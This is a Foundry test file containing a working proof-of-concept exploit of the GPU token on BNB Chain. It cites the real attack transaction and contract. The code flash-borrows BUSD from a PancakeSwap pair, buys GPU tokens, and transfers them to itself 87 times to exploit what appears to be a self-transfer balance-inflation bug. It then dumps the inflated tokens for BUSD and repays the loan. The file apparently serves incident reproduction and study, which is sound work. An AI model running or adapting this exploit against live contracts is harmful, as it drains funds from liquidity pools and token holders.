// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// Profit : ~32 USD
// TX : https://app.blocksec.com/explorer/tx/bsc/0x2c0ada695a507d7a03f4f308f545c7db4847b2b2c82de79e702d655d8c95dadb
// GUY : https://twitter.com/PeckShieldAlert/status/1788153869987611113
// Vuln Contract: https://bscscan.com/address/0xf51cbf9f8e089ca48e454eb79731037a405972ce

contract GPUExploit is Test {
    IERC20 gpuToken_ = IERC20(address(0xf51CBf9F8E089Ca48e454EB79731037a405972ce));
    IERC20 busd_ = IERC20(payable(address(0x55d398326f99059fF775485246999027B3197955)));

    IUniswapV2Pair busd_wbnb_ = IUniswapV2Pair(address(0x16b9a82891338f9bA80E2D6970FddA79D1eb0daE));
    IUniswapV2Router router_ = IUniswapV2Router(payable(address(0x10ED43C718714eb63d5aA57B78B54704E256024E)));
    // IUniswapV2Router
    function setUp() external {
        vm.createSelectFork("bsc", 38_539_572);
    }

    function testExploit() public {
        
        emit log_named_decimal_uint("Ack before = ", busd_.balanceOf(address(this)), busd_.decimals());
        busd_wbnb_.swap(22600 ether, 0,address(this), "0x42");
        emit log_named_decimal_uint("Ack After = ", busd_.balanceOf(address(this)), busd_.decimals());
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data)external{
        address[] memory path = new address[](2);
        path[0] = address(busd_);
        path[1] = address(gpuToken_);

        uint256 amountOut = router_.getAmountsOut(amount0, path)[1];
        busd_.approve(address(router_), amount0);
        router_.swapExactTokensForTokens(amount0, amountOut, path, address(this), block.timestamp);

        console.log("===ACK START===");
        for(int i = 0; i < 87; i++){
            gpuToken_.transfer(address(this), gpuToken_.balanceOf(address(this)));
        }
        console.log("===ACK END===");

        path[0] = address(gpuToken_);
        path[1] = address(busd_);
        gpuToken_.approve(address(router_), gpuToken_.balanceOf(address(this)));
        router_.swapExactTokensForTokensSupportingFeeOnTransferTokens(type(uint112).max, 1, path, address(this), block.timestamp);

        busd_.transfer(address(busd_wbnb_), amount0 + (amount0 * 3/1000) + 1); // 0.03% fee
                    
    }
}

